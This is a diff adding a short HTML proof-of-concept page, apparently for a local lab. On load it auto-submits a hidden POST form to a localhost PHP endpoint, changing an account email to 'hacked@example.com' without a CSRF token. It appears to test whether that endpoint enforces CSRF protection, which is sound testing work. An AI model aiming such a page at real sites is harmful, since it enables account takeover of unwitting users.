@@ -1,0 +1,9 @@
+<!-- csrf_exploit.html -->
+<html>
+  <body onload="document.forms[0].submit()">
+    <form action="http://localhost/GitHub/MP/csrf_token_bypass.php" method="POST">
+      <input type="hidden" name="email" value="hacked@example.com">
+      <!-- 🚫 CSRF token is intentionally left out -->
+    </form>
+  </body>
+</html>
